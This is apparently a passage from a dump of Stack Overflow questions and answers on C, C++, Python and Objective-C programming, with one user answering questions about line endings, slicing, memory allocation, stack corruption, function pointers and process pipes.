","9530","","<p>If you're not required to use Python, you might consider using Cygwin Bash along with the <a href=""http://linux.die.net/man/1/timeout"" rel=""nofollow""><code>timeout(1)</code></a> command to run a command with a timeout.  However, since Cygwin's implementation of <code>fork()</code> is not very fast and you're creating an enormous number of processes, you'll likely have an enormous overhead of just creating processes (I don't know if the native Windows version of Python is any better in this regard).</p>

<p>Alternatively, if you have the source code to <code>P1</code>, why don't you just modify it so that it can perform multiple iterations of whatever it is that it does in one invocation?  That way, you don't have to deal with creating and killing 480,000 processes, which will make a huge difference if the amount of work that each invocation does is small.</p>
"
"<p>I compiled on Ubuntu a program that was developed for (and works on) Windows.  On Ubuntu, I see this code:</p>

<pre><code>string s = values_[9];
cout &lt;&lt; s &lt;&lt; endl;
cout &lt;&lt; s &lt;&lt; ""x\n"";
</code></pre>

<p>producing this output:</p>

<pre><code>high
xigh
</code></pre>

<p>The expected output for the second line is ""highx"".  I know that the value of values_[9] is originally read from a file (written on Windows).  Printing other strings seems to work normally.</p>

<p>What's going on here?</p>
","9530","","<p>The string you're printing has a carriage return <code>'\r'</code> in it.  What's happening is that you're printing <code>high</code>, then the carriage return, which puts the cursor back on the start of the line.  Then, when you print the <code>x</code>, it overwrites the first letter on the line.</p>

<p>You should either remove the carriage return from the source file (e.g. with <a href=""http://linux.die.net/man/1/dos2unix"" rel=""nofollow""><code>dos2unix(1)</code></a> or many other options), or change your code to strip the carriage return after reading the file in.</p>
"
"<p>I was asked this for a coding test and didn't know the answer. Anyone have any ideas?</p>

<p>Thanks guys.</p>
","9530","","<p><code>a = b[:]</code> calls either <a href=""http://docs.python.org/reference/datamodel.html#object.__getslice__"" rel=""nofollow""><code>__getslice__</code></a> or <a href=""http://docs.python.org/reference/datamodel.html#object.__getitem__"" rel=""nofollow""><code>__getitem__</code></a> on <code>b</code> and assigns the result to <code>a</code>.  In nearly all cases (e.g. lists, tuples, and other sequence types), this makes a shallow copy of the sequence; I don't know of any classes that don't implement that behavior, but you could have a user-defined type that did something different.  Any other objects that previously referred to the old value of <code>a</code> will continue to refer to that old value.</p>

<p><code>a[:] = b</code>, on the other hand, calls <a href=""http://docs.python.org/reference/datamodel.html#object.__setslice__"" rel=""nofollow""><code>__setslice__</code></a> or <a href=""http://docs.python.org/reference/datamodel.html#object.__setitem__"" rel=""nofollow""><code>__setitem__</code></a> to replace a subset of the elements of <code>a</code> with those of the sequence <code>b</code>.  In this case, if the sequence type of <code>a</code> is well-behaved, this will replace the entirety of <code>a</code>, since the range <code>:</code> without endpoints indicates the entire sequence.  The difference here is that immutable types, such as tuples, will not allow you to perform <code>__setslice__</code> (e.g. by throwing a <code>TypeError</code> exception).  Any other objects that previously referred to <code>a</code> will also be updated, since the underlying object is being modified.</p>

<p>For mutable types such as <code>list</code>, the result of <code>a = b[:]</code> will be identical to <code>a[:] = b</code>, in that <code>a</code> will be a shallow copy of <code>b</code>; for immutable types such as <code>tuple</code>, <code>a[:] = b</code> is invalid.  For badly-behaved user-defined types, all bets are off.  There's also a difference in what happens to other objects that referred to the same object as <code>a</code> -- with <code>a = b[:]</code>, they refer to the original value (<code>a</code>), but with <code>a[:] = b</code>, they refer to the modified object (shallow copy of <code>b</code>).</p>
"
"<p>In my program I'd like to be notified when a user inserts a usb/firewire/etc drive in the computer.</p>

<p>I don't know if there is a special way just for drives, but I think there should be a way with normal folders. Since all external drives are in the /Volumes folder, I'd like a way to observe that folder and have a method called or something when it's contents change.</p>
","9530","","<p>Use the <a href=""http://developer.apple.com/library/mac/#documentation/Darwin/Conceptual/FSEvents_ProgGuide/Introduction/Introduction.html"" rel=""nofollow"">File Systems Events API</a>.  It's C API, not an Objective-C API, but it's still perfectly usable from Objective-C.</p>
"
"<p>I'm trying to parse data from stdin in binary mode under Win32.
The first thing my code does is to check for a 4byte header at the beginning:</p>

<pre><code>int riff_header;
fread(&amp;riff_header, sizeof(riff_header), 1, ifp);
//  'RIFF' = little-endian
if (riff_header != 0x46464952) {
    fprintf(stderr, ""wav2msu: Incorrect header: Invalid format or endianness\n"");
    fprintf(stderr, ""         Value was: 0x%x\n"", riff_header);
    return -1;
}
</code></pre>

<p><code>stdin</code> has been switched to binary mode before reading from it:</p>

<pre><code>if (*argv[argc-1] == '-') {
    fprintf(stderr, ""Reading from stdin.\n"");
    infile = stdin;
    // We need to switch stdin to binary mode, or else we run
    // into problems under Windows
    freopen(NULL, ""rb"", stdin);
}
</code></pre>

<p>This code works fine under Linux, however on Win32 (specifically Windows XP), the <code>fread</code> only seems to read a single byte and thus cause the evaluation to fail.
Example:</p>

<pre><code>&gt; ffmeg.exe -i ..\test.mp3 -f wav pipe:1 2&gt; nul |..\foo.exe -o test.bin -
Reading from stdin.
foo: Incorrect header: Invalid format or endianness
     Value was: 0x4
</code></pre>

<p>What am I doing wrong?</p>
","9530","","<p>According to the <a href=""http://msdn.microsoft.com/en-us/library/wk2h68td%28v=vs.80%29.aspx"" rel=""nofollow"">MSDN documentation</a>, it's not permitted to pass <code>NULL</code> for the <code>path</code> parameter of <code>freopen</code>, so the call to <code>freopen</code> is almost certainly failing; have you checked the return value and the value of <code>errno</code>?  C89 does not specify the behavior of <code>freopen</code> when <code>path</code> is <code>NULL</code>; C99 does, but the Microsoft C runtime is not (and does not claim to be) C99-compliant.</p>

<p>If you really need to read binary info from <code>stdin</code>, you might have to use platform-specific code and read the raw binary data directly with <a href=""http://msdn.microsoft.com/en-us/library/aa365467%28v=vs.85%29.aspx"" rel=""nofollow""><code>ReadFile</code></a> on the file <a href=""http://msdn.microsoft.com/en-us/library/ms683231%28v=vs.85%29.aspx"" rel=""nofollow""><code>GetStdHandle(STD_INPUT_HANDLE)</code></a>.</p>
"
"<p>I use HeapAlloc to alloc a huge amount of memory, like 400 MB, but when i check the Memory Usage of my program it really uses like 1 GB. </p>

<pre><code>//configuraciones.h
#define ANCHO_MUNDO 5000
#define ALTO_MUNDO 5000

//unidades.cpp
unidad* unidades_memoria = (unidad*)HeapAlloc(heap,  //User Heap
         NULL,ANCHO_MUNDO*ALTO_MUNDO*sizeof unidad);

unidad*** unidades = new unidad**[ANCHO_MUNDO];   //Default Heap
for(int i = 0; i &lt; ANCHO_MUNDO;i++)
    unidades[i] = new unidad*[ALTO_MUNDO];

unidad* actual = unidades_memoria;
unsigned int id = 0;
</code></pre>

<p>I debuged my program and I realized that the memory usage icreases when this code is executed</p>

<pre><code>for (int y = 0; y &lt; ALTO_MUNDO;y++)
  for (int x = 0; x &lt; ANCHO_MUNDO;x++)
  {
    unidades[x][y] = actual;
    actual++;
    unidades[x][y]-&gt;id = id;
    id++;
    unidades[x][y]-&gt;dueño = 0;
    memset(&amp;unidades[x][y]-&gt;addr,0,sizeof(unidades[x][y]-&gt;addr));
  }
</code></pre>

<p>Why is this happening??</p>
","9530","","<p>When you allocate memory, you get all of the virtual address space right away, but it doesn't get mapped into physical memory until you actually write to each page.  When you write to a page for the first time, it generates a page fault, and at which point the OS will map in a physical page of memory and restart the operation that generated the page fault.</p>

<p>It does this as an optimization—if it turns out that your program allocates a huge amount of memory but only ever uses a small portion of it, the OS never has to map physical memory, and your program can just pretend as if it has all of that memory.</p>
"
"<p>I need to calculate the time that a piece of my code takes to execute, right now I am using clock_t like so:</p>

<pre><code>clock_t start = clock();

/* Do something here */

float executionTime = (clock()-(float)start) / CLOCKS_PER_SEC;
</code></pre>

<p>This works in the simulator, but when run on the device the value is always lower than what it should be. When running the simulator and my device at the same time the simulator finishes first but when my device finishes it has a shorter execution time.</p>

<p>The only difference between the simulator code and the device code is that a couple of functions are written in ARM assembly for the device.</p>

<p>In case this is relevant im using Xcode 4.1 and iOS 4.3.</p>
","9530","","<p>Have you tried using either <a href=""http://developer.apple.com/library/ios/#documentation/system/conceptual/manpages_iphoneos/man2/gettimeofday.2.html"" rel=""nofollow""><code>gettimeofday(2)</code></a> or <a href=""http://developer.apple.com/library/mac/#qa/qa1398/_index.html"" rel=""nofollow""><code>mach_absolute_time()</code></a> instead?</p>
"
"<p>I'm having trouble with GCC optimization in a C program. It's x86_64 code (C and inline assembly, though there's no asm in the .o file that is troublesome), run on OS X 10.6.</p>

<p>Here's how it looks while running with -O0 vs -O2:</p>

<pre><code>$ gcc -m64 -std=gnu99 -o bin/ctr keyschedule.c aes.c ctr.c debug.c misc.c -O0 -Wall
$ bin/ctr -e testing/plaintext -o testing/cipher
encrypt_file called with inpath: testing/plaintext
encrypt_file called with outpath: testing/cipher
file_size called with argument 0x7fff5fbff84b
nonce = 6e32b6797e849081
(... no more output, but it works as it should)

$ gcc -m64 -std=gnu99 -o bin/ctr keyschedule.c aes.c ctr.c debug.c misc.c -O2 -Wall
$ bin/ctr -e testing/plaintext -o testing/cipher
encrypt_file called with inpath: testing/plaintext
encrypt_file called with outpath: testing/cipher
file_size called with argument 0x7fff5f000000
Segmentation fault
</code></pre>

<p>... along with the OS X crash reporter popping up:</p>

<pre><code>Exception Type:  EXC_BAD_ACCESS (SIGSEGV)
Exception Codes: KERN_PROTECTION_FAILURE at 0x00007fff5f000000
Crashed Thread:  0  Dispatch queue: com.apple.main-thread

Thread 0 Crashed:  Dispatch queue: com.apple.main-thread
0   libSystem.B.dylib               0x00007fff88d3bad8 perror + 52
1   ctr                             0x0000000100001339 file_size + 73 (ctr.c:32)
2   ctr                             0x00000001000017be encrypt_file + 158 (ctr.c:72)
3   ctr                             0x0000000100001bd1 main + 289 (ctr.c:242)
4   ctr                             0x0000000100000bd4 start + 52
</code></pre>

<p>... and here's most of the code that is needed (let's just say that the argument parser is rather temporary):</p>

<pre><code>int main(int argc, char *argv[]) {
...
    if (strcmp(argv[1], ""-e"") == 0)
        encrypt_file(argv[2], argv[4], key); // It crashes with static paths as well
...
}

void encrypt_file(const char *inpath, const char *outpath, const unsigned char *key) {
    printf(""encrypt_file called with inpath: %s\n"", inpath);
    printf(""encrypt_file called with outpath: %s\n"", outpath);

    // Create a pointer to the correct function to use for this CPU
    void (*aes_encrypt)(const unsigned char *, unsigned char *, const unsigned char *);
    if (test_aesni_support()) {
        aes_encrypt = aes_encrypt_aesni;
    }
    else {
        aes_encrypt = aes_encrypt_c;
    }

    unsigned char expanded_keys[176] = {0};
    aes_expand_key(key, expanded_keys);

    off_t size = file_size(inpath);
    if (size &lt;= 0) {
        fprintf(stderr, ""Cannot encrypt a file of size zero!\n"");
        exit(1);
    }
    ....
}

off_t file_size(const char *path) {
    printf(""file_size called with argument %p\n"", path);
    struct stat st;
    if (stat(path, &amp;st) != 0) {
        perror(path);
        exit(1);
    }

    return (st.st_size);
}
</code></pre>

<p>I suspect that there's something in my code (rather than assuming the bug is in GCC), but I can't find anything.  </p>

<p>If the code above looks fine (I can't really imagine the problem is in any other code, as it's quite unrelated to the crash), what should I be doing to track this down?</p>

<p>GDB:</p>

<pre><code>#0  0x00007fff88d3bad8 in perror ()
(gdb) bt
#0  0x00007fff88d3bad8 in perror ()
#1  0x0000000100001339 in file_size (path=0x7fff5f000000 """") at ctr.c:31
#2  0x00000001000017be in encrypt_file (inpath=0x7fff5f000000 """", outpath=0x7fff5fbff860 ""testing/cipher"", key=0x7fff5fbff6b0 ""-~??9?9&gt;?W\n\021\001?N\026"") at ctr.c:72
#3  0x0000000100001bd1 in main (argc=&lt;value temporarily unavailable, due to optimizations&gt;, argv=0x7fff5fbff718) at ctr.c:242
(gdb) frame 2
#2  0x00000001000017be in encrypt_file (inpath=0x7fff5f000000 """", outpath=0x7fff5fbff860 ""testing/cipher"", key=0x7fff5fbff6b0 ""-~??9?9&gt;?W\n\021\001?N\026"") at ctr.c:72
72      off_t size = file_size(inpath);
(gdb) l
67      }
68  
69      unsigned char expanded_keys[176] = {0};
70      aes_expand_key(key, expanded_keys);
71  
72      off_t size = file_size(inpath);
73      if (size &lt;= 0) {
74          fprintf(stderr, ""Cannot encrypt a file of size zero!\n"");
75          exit(1);
76      }
</code></pre>

<p>Valgrind:</p>

<pre><code>$ valgrind bin/ctr -e testing/plaintext -o testing/cipher
==1165== Memcheck, a memory error detector
==1165== Copyright (C) 2002-2010, and GNU GPL'd, by Julian Seward et al.
==1165== Using Valgrind-3.7.0.SVN and LibVEX; rerun with -h for copyright info
==1165== Command: bin/ctr -e testing/plaintext -o testing/cipher
==1165== 
encrypt_file called with inpath: testing/plaintext
encrypt_file called with outpath: testing/cipher
file_size called with argument 0x7fff5f000000
==1165== Syscall param stat64(path) points to unaddressable byte(s)
==1165==    at 0x2BB52: stat$INODE64 (in /usr/lib/libSystem.B.dylib)
==1165==    by 0x10000179D: encrypt_file (ctr.c:73) // this is the call to file_size() in encrypt_file()
==1165==    by 0x100001BB0: main (ctr.c:243)
==1165==  Address 0x7fff5f000000 is not stack'd, malloc'd or (recently) free'd
==1165== 
file_size: Bad address
==1165== 
==1165== HEAP SUMMARY:
==1165==     in use at exit: 4,184 bytes in 2 blocks
==1165==   total heap usage: 2 allocs, 0 frees, 4,184 bytes allocated
==1165== 
==1165== LEAK SUMMARY:
==1165==    definitely lost: 0 bytes in 0 blocks
==1165==    indirectly lost: 0 bytes in 0 blocks
==1165==      possibly lost: 0 bytes in 0 blocks
==1165==    still reachable: 4,096 bytes in 1 blocks
==1165==         suppressed: 88 bytes in 1 blocks
==1165== Rerun with --leak-check=full to see details of leaked memory
==1165== 
==1165== For counts of detected and suppressed errors, rerun with: -v
==1165== ERROR SUMMARY: 1 errors from 1 contexts (suppressed: 0 from 0)
</code></pre>

<p>Edit: Replaced encrypt_file() with the unabridged version (to the point it crashes), added GDB info and replaced the OS X crash reporter output with the output from running a -g binary.</p>

<p>Edit 2: Added valgrind output.</p>
","9530","","<p>It sounds like you have some sort of memory stomping happening somewhere.  The argument <code>path</code> in <code>file_size</code> is clearly an invalid pointer when it gets there.</p>

<p>If what you posted for <code>encrypt_file</code> is everything that happens in that function before the call to <code>file_size</code>, then the culprit is almost certainly <code>aes_expand_key</code> -- are you sure you're passing a correctly sized buffer of 176 bytes?  If that buffer is too small, then <code>aes_expand_key</code> will overwrite other data on the stack, including the local variable <code>inpath</code>.  Try increasing the size of <code>expanded_keys</code>; check the documentation on <code>aes_expand_key</code> to find out how big it needs to be.</p>
"
"<p>I have this code:</p>

<pre><code> std::wstringstream outstream;
 outstream &lt;&lt; (prop.m_pwszOriginalVolumeName 
             ? prop.m_pwszOriginalVolumeName 
             : L""null"") &lt;&lt; L"";""
           &lt;&lt; (prop.m_pwszSnapshotDeviceObject 
             ? prop.m_pwszSnapshotDeviceObject 
             : L""null"") &lt;&lt; L"";""
           &lt;&lt; (prop.m_pwszOriginatingMachine 
             ? prop.m_pwszOriginatingMachine
             : L""null"") &lt;&lt; L"";""
           &lt;&lt; ... // some more strings here
</code></pre>

<p>Is there a way to avoid code duplication and still have concise code?</p>
","9530","","<p>You could use a helper function:</p>

<pre><code>const wchar_t *SafeOutput(const wchar_t *str)
{
    return str ? str : L""null"";
}
// Analogous function for ANSI strings
...
outstream &lt;&lt; SafeOutput(prop.m_pwszOriginalVolumeName)   &lt;&lt; L"";""
          &lt;&lt; SafeOutput(prop.m_pwszSnapshotDeviceObject) &lt;&lt; L"";""
          &lt;&lt; SafeOutput(prop.m_pwszOriginatingMachine)   &lt;&lt; L"";""
          &lt;&lt; ... // more strings here
</code></pre>
"
"<p>My python script executes an <code>os.listdir(path)</code> where the path is a queue containing archives that I need to treat one by one. </p>

<p>The problem is that I'm getting the list in an array and then I just do a simple <code>array.pop(0)</code>. It was working fine until I put the project in subversion. Now I get the <code>.svn</code> folder in my array and of course it makes my application crash.</p>

<p>So here is my question: is there an existing function that ignore hidden files when executing an <code>os.listdir()</code> and if not what would be the best way?</p>

<p>Thank you.</p>
","9530","","<p>You can write one yourself:</p>

<pre><code>def listdir_nohidden(path):
    for f in os.listdir(path):
        if not f.startswith('.'):
            yield f
</code></pre>

<p>Or you can use a <a href=""http://docs.python.org/library/glob.html"">glob</a>:</p>

<pre><code>def listdir_nohidden(path):
    return glob.glob(os.path.join(path, '*'))
</code></pre>

<p>Either of these will ignore all filenames beginning with <code>'.'</code>.</p>
"
"<p>I have two methods, the generateRandomCard method gets called within the testMethod, where there is a for loop that runs 100 times. That way it works perfect, but if I set the for loop limit to 1000 or any other number greater than 100 it crashes. Can you see what's wrong?? </p>

<pre><code>- (void)testMethod {

    Globals *myGlobals = [Globals sharedInstance];
    int rankOfFirst = 0;
    int rankOfSecond = 0;
    int playerOneWin = 0;
    int playerTwoWin = 0;
    int ties = 0;
    float firstPercent = 0;
    float secondPercent = 0;
    float tiePercent = 0;
    FiveEval *evaluator = [FiveEval theEvaluator];

    for (int i = 0; i &lt; 100; i++) {
        short fPF = [self generateRandomCard];
        short fPS = [self generateRandomCard];
        short sPF = [self generateRandomCard];
        short sPS = [self generateRandomCard];
        short fFlop = [self generateRandomCard];
        short sFlop = [self generateRandomCard];
        short tFlop = [self generateRandomCard];
        short tur = [self generateRandomCard];
        short riv = [self generateRandomCard];

        rankOfFirst = [evaluator getRankOfSeven:fFlop 
                                               :sFlop 
                                               :tFlop
                                               :tur 
                                               :riv 
                                               :fPF 
                                               :fPS];

        rankOfSecond = [evaluator getRankOfSeven:fFlop 
                                             :sFlop 
                                             :tFlop 
                                             :tur 
                                             :riv 
                                             :sPF 
                                             :sPS];

        if (rankOfFirst &gt; rankOfSecond) {
            playerOneWin++;
        } else if (rankOfSecond &gt; rankOfFirst) {
            playerTwoWin++;
        } else {
            ties++;
        }

        [myGlobals.alreadyPickedCards removeAllObjects];
    }

    firstPercent = ((float)playerOneWin/(float)10000)*100;
    secondPercent = ((float)playerTwoWin/(float)10000)*100;
    tiePercent = ((float)ties/(float)10000)*100;

    NSLog(@""First Player Equity: %f"", firstPercent);
    NSLog(@""Second Player Equity: %f"", secondPercent);
    NSLog(@""Tie Equity: %f"", tiePercent);
}


- (short)generateRandomCard {

    Globals *myGlobals = [Globals sharedInstance];
    short i = arc4random()%51;
    for (int j = 0; j &lt; [myGlobals.alreadyPickedCards count]; j++) {
        if (i == [[myGlobals.alreadyPickedCards objectAtIndex:j] shortValue]) {
            [self generateRandomCard];
        }
    }
    [myGlobals.alreadyPickedCards addObject:[NSNumber numberWithShort:i]];
    return i;
}
</code></pre>
","9530","","<p>You're probably <a href=""http://en.wikipedia.org/wiki/Stack_overflow"" rel=""nofollow"">overflowing your stack</a> in the recursive call to <code>-generateRandomCard</code>.  If you generate a card that's already been picked, you call yourself recursively (and ignore the result, which is a different bug).  So, if your random number stream gave you an unlucky sequence that kept returning cards you've already picked, then you'll recurse infinitely until the stack overflows.</p>

<p>Change your card selection algorithm so that instead of using <a href=""http://en.wikipedia.org/wiki/Rejection_sampling"" rel=""nofollow"">rejection sampling</a> with the potential for infinite looping/recursion, it uses an algorithm with a bounded runtime such as the <a href=""http://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle"" rel=""nofollow"">Fisher-Yates shuffle</a>.</p>
"
"<p>I had this conversation with a colleague, and it turned out to be interesting. Say we have the following POD class</p>

<pre><code>struct A { 
  void clear() { memset(this, 0, sizeof(A)); } 

  int age; 
  char type; 
};
</code></pre>

<p><code>clear</code> is intended to clear all members, setting to <code>0</code> (byte wise). What could go wrong if we use <code>A</code> as a base class? There's a subtle source for bugs here. </p>
","9530","","<p>In theory, the compiler can lay out base classes differently.  C++03 §10 paragraph 5 says:</p>

<blockquote>
  <p>A base class subobject might have a layout (3.7) different from the layout of a most derived object of the same type.</p>
</blockquote>

<p>As <a href=""http://stackoverflow.com/questions/7113422/why-can-it-be-dangerous-to-use-this-pod-struct-as-a-base-class/7113474#7113474"">StackedCrooked mentioned</a>, this might happen by the compiler adding padding to the end of the base class <code>A</code> when it exists as its own object, but the compiler might not add that padding when it's a base class.  This would cause <code>A::clear()</code> to overwrite the first few bytes of the members of the subclass.</p>

<p>However in practice, I have not been able to get this to happen with either GCC or Visual Studio 2008.  Using this test:</p>

<pre><code>struct A
{
  void clear() { memset(this, 0, sizeof(A)); }

  int age;
  char type;
};

struct B : public A
{
  char x;
};

int main(void)
{
  B b;
  printf(""%d %d %d\n"", sizeof(A), sizeof(B), ((char*)&amp;b.x - (char*)&amp;b));
  b.x = 3;
  b.clear();
  printf(""%d\n"", b.x);

  return 0;
}
</code></pre>

<p>And modifying <code>A</code>, <code>B</code>, or both to be 'packed' (with <a href=""http://msdn.microsoft.com/en-us/library/2e70t5y1%28v=vs.80%29.aspx"" rel=""nofollow""><code>#pragma pack</code></a> in VS and <a href=""http://gcc.gnu.org/onlinedocs/gcc-3.2/gcc/Type-Attributes.html"" rel=""nofollow""><code>__attribute__((packed))</code></a> in GCC), I couldn't get <code>b.x</code> to be overwritten in any case.  Optimizations were enabled.  The 3 values printed for the sizes/offsets were always 8/12/8, 8/9/8, or 5/6/5.</p>
"
"<p>I'd like to have a standard function that will convert relative paths into absolute ones, and if possible I'd like to make it as cross-platform as possible (so I'd like to avoid calling external library functions). This is intended so it's possible to prevent path exploitations.</p>

<p>I am aware that such a function wouldn't be able to detect symbolic links, but I'm ok with that for my application.</p>

<p>I could roll my own code, but there might be some problems with e.g. how a platform handles encoding or variations of the ""../"" pattern. </p>

<p>Is there something like that already implemented? </p>
","9530","","<p>There's not a single, universal function you can call, since there's no such function in the C or C++ standard libraries.  On Windows, you can use <a href=""http://msdn.microsoft.com/en-us/library/aa364963%28v=VS.85%29.aspx"" rel=""nofollow""><code>GetFullPathName</code></a>.  On Linux, Mac OS X, and other *Unix-based systems, you can use the <a href=""http://pubs.opengroup.org/onlinepubs/009695399/functions/realpath.html"" rel=""nofollow""><code>realpath(3)</code></a> function, which as a bonus also resolves symbolic links along the way.</p>

<p>Keep in mind though that any solution to this is only reliable in a single-threaded program—if you're using multiple threads, another can go out and change the working directory out form under you unexpectedly, changing the path name resolution.</p>
"
"<p>I don't know the correct key to search for this type of friend on the Internet, simply a keyword friend alone won't bring this expected result.</p>

<pre><code>class Integer
{
   friend int;
};
</code></pre>

<p>What does friend int means ?</p>
","9530","","<p>It's invalid C++, it should be rejected by your compiler.  g++ gives the two errors ""error: a class-key must be used when declaring a friend"" and ""error: invalid type ‘int’ declared ‘friend’"".</p>

<p>It's only meaningful if the thing which is being ""friend""ed is a function or class name.  In that case, the named function, or all of the member functions of the named class, can access your class's private and protected members as if they were public.</p>

<p>For example:</p>

<pre><code>class MyClass
{
public:
  int x;
protected:
  int y;
private:
  int z;

  friend void SomeFunction(const MyClass&amp; a);  // Friend function
  friend class OtherClass;  // Friend class
};

void SomeFunction(const MyClass&amp; a)
{
  std::cout &lt;&lt; a.x &lt;&lt; a.y &lt;&lt; a.z;  // all ok
}

void AnotherFunction(const MyClass&amp; a)
{
  std::cout &lt;&lt; a.x &lt;&lt; a.y &lt;&lt; a.z;  // ERROR: 'y' and 'z' are not accessible
}

class OtherClass
{
  void ClassMethod(const MyClass&amp; a)
  {
    std::cout &lt;&lt; a.x &lt;&lt; a.y &lt;&lt; a.z;  // all ok
  }
};

class ThirdClass
{
  void ClassMethod(const MyClass&amp; a)
  {
    std::cout &lt;&lt; a.x &lt;&lt; a.y &lt;&lt; a.z;  // ERROR: 'y' and 'z' not accessible
  }
};
</code></pre>
"
"<p>Is it possible to format string in scientific notation in the following ways:</p>

<ul>
<li>set fixed places in exponent: 1</li>
<li><p>set fixed decimal places in mantisa: 0</p>

<pre><code>double number = 123456.789
</code></pre></li>
</ul>

<p>So the number should be formated</p>

<pre><code>  1e+5
</code></pre>

<p>I am not able to set 0 decimal points for mantisa:</p>

<pre><code>cout.precision(0);
cout &lt;&lt; scientific &lt;&lt; number;
</code></pre>

<p>result:</p>

<pre><code>1.234568e+005
</code></pre>
","9530","","<p>I'm not sure what C++ compiler you're using that's giving you 3 digits for the exponent—the C and C++ standards require a minimum of 2 digits for that, and that's what g++ does.  There's no way to get only one digit using the standard C or C++ I/O functions, so you'll have to roll your own solution.  Since doing a floating-point to string conversion is <a href=""http://www.lomont.org/Math/Papers/2007/Excel2007/Excel2007Bug.pdf"" rel=""nofollow"">a very tricky problem</a> [PDF], I'd strongly recommend not doing that and postprocessing the result instead.</p>

<p>Here's one way to do that:</p>

<pre><code>// C version; you can rewrite this to use std::string in C++ if you want
void my_print_scientific(char *dest, size_t size, double value)
{
    // First print out using scientific notation with 0 mantissa digits
    snprintf(dest, size, ""%.0e"", value);

    // Find the exponent and skip the ""e"" and the sign
    char *exponent = strchr(dest, 'e') + 2;

    // If we have an exponent starting with 0, drop it
    if(exponent != NULL &amp;&amp; exponent[0] == '0')
    {
        exponent[0] = exponent[1];
        exponent[1] = '\0';
    }
}
</code></pre>
"
"<p>say I have this function:</p>

<pre><code>int func2()
{
    printf(""func2\n"");
    return 0;
}
</code></pre>

<p>Now I declare a pointer:</p>

<pre><code>int (*fp)(double);
</code></pre>

<p>This should point to a function that returns int and receives double as an argument.
func2 does NOT have any arguments, but still when I write</p>

<pre><code>fp = func2;
fp(2);
</code></pre>

<p>func2 is invoked correctly. 2 is just a random number. 
So my question is - how is it? Is there no meaning to arguments when I declare a function pointer?
Thanks</p>
","9530","","<p>Yes, there is a meaning.  In C (but <em>not</em> in C++), a function declared with an empty set of parentheses means it takes an <em>unspecified</em> number of parameters.  When you do this, you're preventing the compiler from checking the number and types of arguments; it's a holdover from before the C language was standardized by ANSI and ISO.</p>

<p>Failing to call a function with the proper number and types of arguments results in <em>undefined behavior</em>.  If you instead explicitly declare your function to take zero parameters by using a parameter list of <code>void</code>, then the compiler will give you a warning when you assign a function pointer of the wrong type:</p>

<pre><code>int func1();  // declare function taking unspecified parameters
int func2(void);  // declare function taking zero parameters
...
// No warning, since parameters are potentially compatible; calling will lead
// to undefined behavior
int (*fp1)(double) = func1;
...
// warning: assignment from incompatible pointer type
int (*fp2)(double) = func2;
</code></pre>
"
"<p>I am trying to implement program that will run multiple chains of shell commands:</p>

<pre><code>        | --&gt; cmd3 --&gt; cmd4 --&gt;
 cmd2--&gt;|
        | --&gt; cmd5 --&gt; cmd6 --&gt;|--&gt; cmd7
                               |
                               |--&gt; cmd8
</code></pre>

<p>and so on...</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;signal.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;sys/types.h&gt;

typedef struct command {
    char* name;
char** argv;
} command;

command parsecmd(char* cmd) {
    command c;

    char delimiter[] = "" "";
    char* buf = malloc(sizeof(char) * strlen(cmd));
    strcpy(buf, cmd);
    char **args = malloc(sizeof(char*));

    char* token = strtok(buf, delimiter);

    int i = 0;
    while (token != NULL) {
      if (i == 0) {
             c.name = token;
          }

      args[i] = token;

      token = strtok(NULL, delimiter);
          ++i;
     }

     args[i] = NULL;

     c.argv = args;

     return c;
}

int mkproc(char *cmd, int outfd)
{
    command c = parsecmd(cmd);
    int pipeleft[2];
    pipe(pipeleft);
    if(!fork()){
        close(pipeleft[1]);
        dup2(pipeleft[0], 0);
        dup2(outfd, 1);
        execvp(c.name, c.argv);
    }
    close(pipeleft[0]);
    return pipeleft[1];
 }

int mktree(char *cmd, int ofd0, ...)
{
    int piperight[2];
    pipe(piperight);

    int cmdin = mkproc(cmd, piperight[1]);
    close(piperight[1]);
    if(!fork()){
        uchar buf[4096];
        int n;

        while((n=read(piperight[0], buf, sizeof buf))&gt;0){
            va_list ap;
            int fd;
            va_start(ap, ofd0);
            for(fd=ofd0; fd!=-1; fd=va_arg(ap, int)){
                write(fd, buf, n);
            }
            va_end(ap);
        }
    }
    return cmdin;
 }

 int main(int argc, char* argv[]) {
       // THIS WORK
       int chain_in = mkproc(""cat foo.txt"", mkproc(""sort"", mkproc(""wc -l"", 1)));
       // THIS WORK
       int tree_in1 = mktree(""cat /tmp/test.log"", mkproc(""grep a"", 1), mkproc(""wc -l"", 2), -1);

       // NOT WORK -&gt; HANG!
       int tree_in2 = mktree(""cat /tmp/test.log"", 
              mktree(""grep test"",
                  mkproc(""uniq"", mkproc(""wc -l"", 1)),
                  mkproc(""wc -l"", 2), -1),
              mkproc(""sort"", 2), -1);
 }
</code></pre>

<p>when running strace on the sub processes, it's stuck on read from pipe,
when running starce on the main process, it's also stuck on read...
The pipe buffer is 64K and I am writing only 4k at once for each pipe</p>

<p>WHAT'S GOING ON?!</p>

<p>THANKS!!!</p>
","9530","","<p>You're not allocating enough memory for your program arguments.  In <code>parsecmd</code>, you're only allocating space for a single pointer in <code>char **args = malloc(sizeof(char*))</code>, and you're subsequently storing more than one pointer in it without reallocating it, resulting in a <a href=""http://en.wikipedia.org/wiki/Buffer_overrun"" rel=""nofollow"">buffer overrun</a>.  Similarly, you're allocating one byte less than you should in <code>char* buf = malloc(sizeof(char) * strlen(cmd))</code>—you need to add one to that in order to have space for the string's terminating NUL.  Also, <code>sizeof(char)</code> is guaranteed to be 1 by the C standard, so there's no need to put that in the call to <code>malloc</code>.</p>

<p>Other problems with your code:</p>

<ul>
<li>You're leaking memory.  All of your calls to <code>malloc</code> need a corresponding call to <code>free</code> to avoid leaking memory.</li>
<li>Add more comments about what your code is doing</li>
<li><code>strtok</code> is not safe to use in multithreaded code, since it uses shared global state.  If this code every needs to become thread-safe, consider replacing it with <a href=""http://linux.die.net/man/3/strtok_r"" rel=""nofollow""><code>strtok_r(3)</code></a> if available, or some other replacement.</li>
<li>You're failing to handle errors, if <code>fork</code>, <code>execvp</code>, or <code>pipe</code> fails</li>
</ul>

<p>Fix these problems and see if that solves your hang.</p>
"
"<p>I am counting the number of non-whitespace characters in the standard input stream (cin) using in.get(). For every character which is not a whitespace character, I increment a counter.</p>

<p>After I'm done counting, I'd like to go back and read the characters. in is a parameter of type std::istream&amp; in (cin in this case).</p>

